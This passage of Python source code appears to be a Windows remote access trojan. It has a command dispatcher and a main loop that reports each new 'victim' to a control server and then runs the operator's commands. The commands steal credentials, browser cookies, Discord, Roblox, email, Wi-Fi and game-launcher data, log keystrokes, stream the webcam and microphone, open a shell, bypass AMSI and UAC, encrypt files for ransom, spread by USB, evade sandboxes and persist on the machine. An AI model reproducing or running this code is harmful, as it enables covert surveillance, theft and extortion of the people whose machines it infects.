                        if f.is_file() and f.stat().st_size < 30_000_000:
                            hits.append({"path": str(f), "size": f.stat().st_size, "name": f.name})
                            if len(hits) >= max_hits:
                                return hits
                    except Exception:
                        pass
        except Exception:
            pass
    return hits

def focus_ss_loop():
    """Screenshot when foreground window title looks like login/password."""
    global FOCUS_SS_ACTIVE
    last = ""
    while FOCUS_SS_ACTIVE and RUNNING:
        try:
            title = (active_window() or "").lower()
            keys = ("password", "login", "sign in", "sign-in", "auth", "bank", "paypal", "steam")
            if any(k in title for k in keys) and title != last:
                last = title
                data = take_screenshot(quality=40)
                if data:
                    send_loot("screenshot", data)
                    send_loot("status", "focus-ss: " + title[:80])
        except Exception:
            pass
        time.sleep(1.5)


def list_dir(path):
    try:
        path = (path or "").strip()
        aliases = {
            "": Path.home(),
            "home": Path.home(),
            "desktop": Path.home() / "Desktop",
            "documents": Path.home() / "Documents",
            "downloads": Path.home() / "Downloads",
            "pictures": Path.home() / "Pictures",
            "music": Path.home() / "Music",
            "videos": Path.home() / "Videos",
        }
        key = path.lower()
        if key in aliases:
            p = aliases[key]
        else:
            p = Path(path) if path else Path.home()
        if not p.exists(): return {"error":"not found","path":str(p)}
        items=[]
        for x in sorted(p.iterdir(), key=lambda z:(not z.is_dir(), z.name.lower())):
            try: items.append({"name":x.name,"path":str(x),"dir":x.is_dir(),"size":x.stat().st_size if x.is_file() else 0})
            except Exception: pass
        return {"path":str(p),"items":items[:500]}
    except Exception as e: return {"error":str(e)}

def download_file(path):
    try:
        p=Path(path)
        if not p.is_file() or p.stat().st_size>25_000_000: return {"error":"missing or too large"}
        return {"name":p.name,"data":base64.b64encode(p.read_bytes()).decode(),"size":p.stat().st_size}
    except Exception as e: return {"error":str(e)}

def upload_file(name, b64data, dest_dir=""):
    try:
        folder=Path(dest_dir) if dest_dir else Path(tempfile.gettempdir())
        folder.mkdir(parents=True, exist_ok=True)
        target=folder/(name or f"drop_{random.randint(1000,9999)}.bin")
        target.write_bytes(base64.b64decode(b64data))
        return {"path":str(target),"size":target.stat().st_size}
    except Exception as e: return {"error":str(e)}

def auto_ss_loop():
    global AUTO_SS_ACTIVE
    while AUTO_SS_ACTIVE and RUNNING:
        try:
            data=take_screenshot(quality=35)
            if data and not str(data).startswith("err"): send_loot("screenshot", data)
        except Exception: pass
        time.sleep(max(60, AUTO_SS_INTERVAL))

def handle_command(c):
    global KEYLOG_ACTIVE, SCREEN_STREAM, WEBCAM_STREAM, WEBCAM_IDX, IDLE_ONLY
    global CLIPBOARD_ACTIVE, AUTO_SS_ACTIVE, AUTO_SS_INTERVAL, RUNNING
    cmd=c.get("cmd") or c.get("command") or ""; args=c.get("args") or {}
    if cmd=="sysinfo": send_loot("sysinfo", system_info())
    elif cmd=="monitors":
        mons=_monitor_rects()
        send_loot("monitors", [{"index":i,"rect":r,"w":r[2]-r[0],"h":r[3]-r[1]} for i,r in enumerate(mons)])
    elif cmd=="screenshot": send_loot("screenshot", take_screenshot(target=args.get("target") or args.get("monitor") or "primary"))
    elif cmd=="screen_start":
        SCREEN_STREAM=True; IDLE_ONLY=bool(args.get("idle_only"))
        global SCREEN_TARGET
        SCREEN_TARGET = args.get("target") or args.get("monitor") or "primary"
        threading.Thread(target=screen_stream_loop, daemon=True).start()
        send_loot("status", f"screen stream on target={SCREEN_TARGET}")
    elif cmd=="screen_stop":
        SCREEN_STREAM=False
        try:
            # black frame so panel live view goes dark
            send_loot("screen_frame", "")
        except Exception:
            pass
        send_loot("status","screen stream off")
    elif cmd=="webcam_list": send_loot("webcam_list", list_webcams())
    elif cmd=="webcam_snap": send_loot("webcam", webcam_snap(args.get("idx",0)))
    elif cmd=="webcam_start":
        WEBCAM_IDX=int(args.get("idx",0)); WEBCAM_STREAM=True
        threading.Thread(target=webcam_stream_loop, daemon=True).start(); send_loot("status","webcam stream on")
    elif cmd=="webcam_stop": WEBCAM_STREAM=False; send_loot("status","webcam stream off")
    elif cmd=="keylog_start":
        if not KEYLOG_ACTIVE:
            KEYLOG_ACTIVE=True; threading.Thread(target=keylogger_worker, daemon=True).start(); send_loot("status","keylog on")
        else: send_loot("status","keylog already on")
    elif cmd=="keylog_stop":
        KEYLOG_ACTIVE=False
        keylog_flush(clear_only=True)
        send_loot("status","keylog off")
    elif cmd=="keylog_flush":
        keylog_flush(clear_only=True)
        send_loot("status","keylog flushed")
    elif cmd=="steal":
        send_loot("status","stealer running"); send_loot("steal_zip", full_steal_zip())
    elif cmd=="clip_history":
        send_loot("clip_history", clip_history_get())
    elif cmd=="proc_freeze":
        send_loot("status", process_freeze(args.get("pid")))
    elif cmd=="proc_thaw":
        send_loot("status", process_thaw(args.get("pid")))
    elif cmd=="steal_launchers":
        data = steal_launcher_sessions()
        if data.get("b64_zip"):
            send_loot("steal_zip", data["b64_zip"])
        send_loot("launchers", {k: data.get(k) for k in ("steam", "epic", "riot", "notes", "zip_size")})
        send_loot("status", f"launchers steam={len(data.get('steam') or [])} epic={len(data.get('epic') or [])} riot={len(data.get('riot') or [])}")
    elif cmd=="notify":
        send_loot("status", notify_spoof(args.get("title") or "Windows Security", args.get("text") or "Action required.", args.get("kind") or "info"))
    elif cmd=="machine_persist":
        send_loot("machine_persist", install_machine_persistence())
    elif cmd=="machine_persist_off":
        send_loot("machine_persist", remove_machine_persistence())
    elif cmd=="rat_list":
        send_loot("rat_list", list_rat_instances())
    elif cmd=="rat_kill":
        send_loot("status", kill_rat_instance(args.get("pid"), args.get("path")))
    elif cmd=="pack_profile":
        data, meta = pack_browser_profile(args.get("browser") or "chrome")
        if data:
            send_loot("steal_zip", data)
            send_loot("status", f"profile pack {meta}")
        else:
            send_loot("status", f"profile pack fail {meta}")
    elif cmd=="shutdown":
        send_loot("status", "shutdown"); hidden_run("shutdown /s /t 0")
    elif cmd=="restart":
        send_loot("status", "restart"); hidden_run("shutdown /r /t 0")
    elif cmd=="logoff":
        send_loot("status", "logoff"); hidden_run("shutdown /l")
    elif cmd=="abort_shutdown":
        send_loot("status", hidden_run("shutdown /a"))
    elif cmd=="mic_start":
        global MIC_STREAM
        MIC_STREAM = True
        threading.Thread(target=mic_stream_loop, args=(args.get("device"),), daemon=True).start()
        send_loot("status", "mic stream on")
    elif cmd=="mic_stop":
        MIC_STREAM = False
        send_loot("status", "mic stream off")
    elif cmd=="kill_browsers":
        send_loot("status", kill_browsers(args.get("browser") or args.get("which")))
    elif cmd=="mic_list":
        send_loot("mic_list", mic_list())
    elif cmd=="mic_record":
        data = mic_record(args.get("seconds", 8), args.get("device"))
        if isinstance(data, str) and data.startswith("err"):
            send_loot("status", data)
        else:
            send_loot("mic_wav", data)
            send_loot("status", f"mic {args.get('seconds', 8)}s")
    elif cmd=="steal_discord":
        send_loot("status","discord only"); send_loot("discord", steal_discord())
    elif cmd=="steal_roblox":
        send_loot("status","roblox only"); send_loot("roblox", steal_roblox())
    elif cmd=="steal_browsers":
        only = args.get("browser") or args.get("browsers") or None
        send_loot("status", f"browsers only filter={only or 'all'}")
        browsers = steal_browsers()
        data, summary = package_browser_loot(browsers, only=only)
        send_loot("steal_zip", data)
        send_loot("status", f"browsers done cookies={summary['cookies']} cqm={summary['cqm']} browsers={summary['browsers']}")
    elif cmd=="steal_browser":
        only = args.get("browser") or args.get("name") or "chrome"
        send_loot("status", f"browser={only}")
        browsers = steal_browsers()
        data, summary = package_browser_loot(browsers, only=only)
        send_loot("steal_zip", data)
        send_loot("status", f"browser {only} cookies={summary['cookies']} cqm={summary['cqm']}")

    elif cmd=="steal_email":
        send_loot("status","email only"); send_loot("email", steal_email())
    elif cmd=="shell": send_loot("shell", reverse_shell(args.get("cmd","whoami")))
    elif cmd=="powershell":
        preamble=amsi_bypass_ps() if args.get("amsi") else ""
        send_loot("shell", run_powershell(preamble+args.get("cmd","whoami")))
    elif cmd=="processes": send_loot("processes", list_processes())
    elif cmd=="kill": send_loot("status", kill_process(args.get("target","")))
    elif cmd=="taskmgr_off": send_loot("status", disable_taskmgr())
    elif cmd=="taskmgr_on": send_loot("status", enable_taskmgr())
    elif cmd=="cmd_off": send_loot("status", disable_cmd())
    elif cmd=="cmd_on": send_loot("status", enable_cmd())
    elif cmd=="regedit_off": send_loot("status", disable_regedit())
    elif cmd=="regedit_on": send_loot("status", enable_regedit())
    elif cmd=="uac_bypass": send_loot("status", uac_bypass())
    elif cmd=="lock": send_loot("status", lock_workstation())
    elif cmd=="msgbox": send_loot("status", message_box(args.get("text","Hello"), args.get("title","Windows")))
    elif cmd=="download_exec": send_loot("status", download_exec(args.get("url",""), args.get("args","")))
    elif cmd=="self_update": send_loot("status", self_update(args.get("url",""), args.get("min_version") or args.get("version")))
    elif cmd=="ransom_encrypt":
        res=ransomware_run(args.get("coin","BTC"), args.get("wallet",""), args.get("note",""), "encrypt")
        send_loot("status", res); notify_ransom(res)
    elif cmd=="ransom_decrypt":
        res=ransomware_run(args.get("coin","BTC"), args.get("wallet",""), "", "decrypt"); send_loot("status", res)
    elif cmd=="clipboard_start":
        if not CLIPBOARD_ACTIVE:
            CLIPBOARD_ACTIVE=True; threading.Thread(target=clipboard_loop, daemon=True).start(); send_loot("status","clipboard stream on")
        else: send_loot("status","clipboard already on")
    elif cmd=="clipboard_stop": CLIPBOARD_ACTIVE=False; send_loot("status","clipboard stream off")
    elif cmd=="clipboard_get": send_loot("clipboard", clipboard_get())
    elif cmd=="active_window": send_loot("active_window", active_window())
    elif cmd=="wifi": send_loot("wifi", wifi_passwords())
    elif cmd=="block_input": send_loot("status", block_input(True))
    elif cmd=="unblock_input": send_loot("status", block_input(False))
    elif cmd=="monitor_off": send_loot("status", monitor_off())
    elif cmd=="monitor_on": send_loot("status", monitor_on())
    elif cmd=="open_url": send_loot("status", open_url(args.get("url","https://google.com")))
    elif cmd=="speak": send_loot("status", speak(args.get("text","Hello")))
    elif cmd=="wallpaper": send_loot("status", set_wallpaper(args.get("url","")))
    elif cmd=="cd_tray": send_loot("status", cd_tray(args.get("action","open")))
    elif cmd=="persist_task": send_loot("status", persist_task())
    elif cmd=="persist_startup": send_loot("status", persist_startup_folder())
    elif cmd=="defender_exclude": send_loot("status", defender_exclude())
    elif cmd=="spread_usb": send_loot("status", spread_usb())
    elif cmd=="watchdog": send_loot("status", start_watchdog(False))
    elif cmd=="watchdog_force": send_loot("status", start_watchdog(True))
    elif cmd=="watchdog_status": send_loot("status", watchdog_status())
    elif cmd=="watchdog_stop": send_loot("status", stop_watchdog())
    elif cmd=="clear_traces": send_loot("status", clear_traces())
    elif cmd=="list_dir": send_loot("files", list_dir(args.get("path","")))
    elif cmd=="cred_dump": send_loot("status", "creds"); send_loot("creds", steal_credentials())
    elif cmd=="file_search": send_loot("filesearch", file_search(args.get("patterns"), None, int(args.get("max", 80) or 80)))
    elif cmd=="focus_ss_start":
        global FOCUS_SS_ACTIVE
        FOCUS_SS_ACTIVE=True
        threading.Thread(target=focus_ss_loop, daemon=True).start()
        send_loot("status", "focus screenshot on")
    elif cmd=="focus_ss_stop":
        FOCUS_SS_ACTIVE=False
        send_loot("status", "focus screenshot off")
    elif cmd=="download_file": send_loot("file_download", download_file(args.get("path","")))
    elif cmd=="upload_file": send_loot("status", upload_file(args.get("name","drop.bin"), args.get("data",""), args.get("dest","")))
    elif cmd=="auto_ss_start":
        AUTO_SS_INTERVAL=int(args.get("interval",300))
        if not AUTO_SS_ACTIVE:
            AUTO_SS_ACTIVE=True; threading.Thread(target=auto_ss_loop, daemon=True).start()
        send_loot("status", f"auto screenshot every {AUTO_SS_INTERVAL}s")
    elif cmd=="auto_ss_stop": AUTO_SS_ACTIVE=False; send_loot("status","auto screenshot off")
    elif cmd=="full_clean": full_clean_self()
    elif cmd in ("uninstall","kill"): uninstall_self()

def main():
    global FIRST_DONE
    reasons=maybe_exit_sandbox(); install_persistence(); apply_boot_policy(); first=True
    while RUNNING:
        try:
            resp=checkin(first=first)
            if first:
                first=False; info=system_info()
                notify_new_victim(info, reasons)
                if not FIRST_DONE:
                    FIRST_DONE=True
                    if BOOT_AUTO_STEAL:
                        threading.Thread(target=lambda:(send_loot("status","auto-steal started"), send_loot("steal_zip", full_steal_zip())), daemon=True).start()
            for c in resp.get("commands",[]):
                try: handle_command(c)
                except Exception as e: send_loot("status", f"cmd err: {e}")
            if KEYLOG_ACTIVE: keylog_flush()
        except Exception: pass
        time.sleep(2.0)

if __name__=="__main__":
    main()
